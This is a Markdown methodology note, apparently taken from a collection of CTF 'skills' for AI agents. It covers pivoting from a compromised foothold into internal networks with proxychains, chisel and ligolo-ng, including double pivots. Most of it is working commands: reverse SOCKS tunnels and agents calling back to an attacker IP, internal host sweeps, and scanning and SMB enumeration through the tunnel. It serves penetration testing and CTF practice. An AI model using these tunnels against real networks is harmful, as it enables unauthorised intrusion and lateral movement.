# Pivoting with Proxychains, Chisel, and Ligolo-ng

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/access-pivoting/pivoting-proxychains.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/access-pivoting/pivoting-proxychains.md)

---

---
name: pivoting-proxychains
category: access-pivoting
triggers: ["proxychains", "chisel", "ligolo-ng", "ligolo", "pivot", "internal network", "double pivot", "socks5", "dead drop", "no ssh server", "subnet discovery"]
tools: ["proxychains", "proxychains4", "chisel", "ligolo-ng", "nmap", "ip", "arp", "socat"]
priority: high
description: Route tooling through a compromised host into internal networks using proxychains, chisel, and ligolo-ng, including double pivots.
---
# Pivoting with Proxychains, Chisel, and Ligolo-ng

## Trigger context
Use after a foothold when the next targets live on a subnet only the foothold can reach, and either there is no SSH server to abuse or you need many tools/hosts routed at once. Signals: `ip a` shows a second NIC (e.g. `10.10.20.x`), `arp -a` lists unknown hosts, or a service references hostnames you cannot resolve. Choose the tool by what runs on the foothold and whether you need SOCKS (proxychains/chisel) or a transparent interface (ligolo-ng).

## Objective
Establish a proxy/tunnel from your attack box through the foothold into the internal network, discover live internal hosts and subnets, and run standard tooling (nmap, curl, crackmapexec, RDP/SMB clients) against them — extending to a second hop (double pivot) when a third network is only reachable from an internal host.

## Methodology (decision tree)
1. **Have SSH on the foothold?** Fastest path: `ssh -D 1080` SOCKS (see tunneling file), then proxychains. Skip chisel.
2. **No SSH, can run a binary on the foothold?**
   - Need SOCKS for CLI tools -> **chisel** reverse SOCKS.
   - Want a transparent interface (scan/connect as if on the LAN, run any tool incl. SYN scans) -> **ligolo-ng**.
3. **Firewall blocks inbound to attacker?** Use *reverse* connections (foothold -> you): chisel client with `R:socks`, or ligolo agent `-connect`.
4. **Third network only visible from an internal host?** Double pivot — stand up a second chisel/ligolo hop through the first.
5. **Configure proxychains** to point at whichever SOCKS the tunnel exposes, then discover hosts before hammering ports.

## Commands & payloads
```bash
# --- proxychains config (/etc/proxychains4.conf or ./proxychains.conf) ---
# Use strict_chain for a known single proxy; dynamic_chain to skip dead proxies.
# Enable name resolution over the tunnel:
#   proxy_dns
# Bottom [ProxyList] entry (match your tunnel's SOCKS port):
#   socks5 127.0.0.1 1080
# Run tooling through it:
proxychains -q nmap -sT -Pn -n -p 22,80,139,445,3389 10.10.20.0/24
proxychains -q crackmapexec smb 10.10.20.0/24
proxychains -q curl http://10.10.20.5/

# --- chisel: reverse SOCKS proxy (foothold has no SSH) ---
# On ATTACKER (server, listens):
./chisel server -p 8000 --reverse
# On FOOTHOLD (client, connects back and offers a SOCKS proxy on the server):
./chisel client 10.13.37.5:8000 R:1080:socks
# -> attacker now has SOCKS5 on 127.0.0.1:1080; point proxychains socks5 127.0.0.1 1080
# Single-port forward instead of SOCKS:
./chisel client 10.13.37.5:8000 R:3389:10.10.20.5:3389   # target RDP -> attacker :3389

# --- ligolo-ng: transparent TUN pivot (no proxychains, real interfaces) ---
# On ATTACKER: create the tun once, then start the proxy/listener:
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
# On FOOTHOLD (agent connects back):
./agent -connect 10.13.37.5:11601 -ignore-cert
# Back in the ligolo proxy console:
session                              # select the agent
ifconfig                             # see the agent's networks
# On ATTACKER: route the discovered subnet into the tun:
sudo ip route add 10.10.20.0/24 dev ligolo
# In proxy console:
start                                # begin tunneling (older builds: tunnel_start)
# Now use ANY tool directly, no proxychains:
nmap -sS 10.10.20.0/24               # SYN scan works over the TUN
```
```bash
# --- Discover internal hosts / subnets from the foothold ---
ip a; ip route            # local NICs and routes -> reveals other subnets
arp -a                    # hosts the foothold has talked to
cat /etc/hosts; cat /etc/resolv.conf
for i in $(seq 1 254); do (ping -c1 -W1 10.10.20.$i >/dev/null && echo 10.10.20.$i up &); done  # quick sweep

# --- Double pivot (network C reachable only from host B) ---
# Hop 1: attacker <- chisel R:1080:socks (via foothold A).
# On A (relay the second chisel server through the first tunnel), or with ligolo:
#   In ligolo, add a listener on the FIRST agent that forwards to a SECOND agent:
#   (proxy console)  listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
# Run a second agent on host B -> attacker, add its subnet route (10.10.30.0/24) to a new tun.
sudo ip route add 10.10.30.0/24 dev ligolo
```

## Branching logic
- proxychains nmap finds nothing -> SOCKS only supports `-sT -Pn` (TCP connect, no ping); add both flags. For SYN/UDP scans use ligolo's TUN instead.
- chisel client cannot connect back -> egress filtering; try common outbound ports (`:443`, `:80`) for the server, or switch direction.
- ligolo `start`/route fails -> confirm the `ip route add ... dev ligolo` matches the subnet from `ifconfig` in the console, and the tun is `up`.
- Name resolution fails through proxychains -> ensure `proxy_dns` is enabled and use hostnames, not just IPs.
- Double pivot latency/instability -> keep chains short; prefer ligolo TUN over stacked SOCKS for the second hop.

## Common pitfalls
- Wrong SOCKS port in `proxychains.conf` vs the tunnel — the single most common failure; keep them in sync.
- Mixing socks4/socks5 lines; ligolo/chisel/ssh `-D` all speak SOCKS5 — use `socks5`.
- Running loud full-subnet scans through a fragile SOCKS chain; scope discovery to likely ports first.
- Forgetting to route the subnet (`ip route add ... dev ligolo`) — ligolo is up but no traffic flows.
- Leaving chisel/ligolo binaries and open reverse proxies on the target after the engagement.

## Proof / verification
- `proxychains -q curl http://<internal-ip>` returns content unreachable directly.
- Internal nmap shows open ports on hosts your attack box cannot otherwise see.
- ligolo `ifconfig` lists the internal subnet, and `ping 10.10.20.x` over the `ligolo` interface succeeds.
- Double pivot proven by reaching a network C host whose route exists only via host B.

## Cross-references
- [sa--instructions--access-pivoting--tunneling-port-forwarding.md](https://raw.githubusercontent.com/BigBread57/zametki/main/07-access-pivoting/sa--instructions--access-pivoting--tunneling-port-forwarding.md) — `ssh -D` SOCKS is the preferred proxychains backend when SSH exists.
- [sa--instructions--access-pivoting--ssh-access-and-keys.md](https://raw.githubusercontent.com/BigBread57/zametki/main/07-access-pivoting/sa--instructions--access-pivoting--ssh-access-and-keys.md) — gaining the foothold credentials/keys that make pivoting possible.

## Credible sources
- HackTricks — Tunneling and Port Forwarding: https://book.hacktricks.wiki/en/generic-methodologies-and-resources/tunneling-and-port-forwarding.html
- chisel — GitHub (jpillora/chisel): https://github.com/jpillora/chisel
- ligolo-ng — GitHub (nicocha30/ligolo-ng): https://github.com/nicocha30/ligolo-ng
- ligolo-ng documentation: https://docs.ligolo.ng/
- proxychains-ng — GitHub: https://github.com/rofl0r/proxychains-ng
